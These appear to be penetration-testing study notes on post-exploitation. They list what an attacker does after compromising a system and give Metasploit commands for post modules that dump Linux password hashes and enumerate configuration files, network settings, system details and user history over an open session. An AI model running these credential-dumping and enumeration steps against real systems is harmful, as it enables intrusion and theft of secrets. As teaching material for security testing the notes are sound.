Once a system has been compromised, the attacker performs the following activities:
- **Rapid assesment** (to characterize the local environment)
- Locate / copy / modify files
- Add new accounts
- Attempts **vertical escalation**
- Attempts to attack other systems (**horizontal escalation**)
- Install **backdoors** 
- **Cleanup the mess** (remove indications of the attack)
---
- In Metasploit, once we selected the exploit:
````
sessions #to see the active sessions like shells made
````
- Now we can select the post to apply, for example:
````
use post/linux/gather/hashdump #post for knowing all the passwords of the target

show options

set SESSION 1 #the session of the previous shell

exploit #to start 
````
All passwords will be shown to us

- Now, in addition, we are going to check if the target is a virtual machine:
````
use post/linux/gather/checkvm

show options

set SESSIONS 1

exploit
````
If it's using VMware or Vbox, it will be shown to us

- Another useful post is the enum_configs, which it will obtain all the important configuration files:
````
use post/linux/gather/enum_configs

show options

set SESSIONS 1

exploit
````

- Anotherone is a post to enumerate the network configuration:
````
use post/linux/gather/enum_network

set SESSION 1

exploit
````

- Anotherone is a post to enumerate the entire file system (installed packages, services, hard disk, OS version, ...):
````
use post/linux/gather/enum_system

set SESSION 1

exploit
````

- Anotherone for the user history:
````
use post/linux/gather/enum_users_history

set SESSIONS 1

exploit
````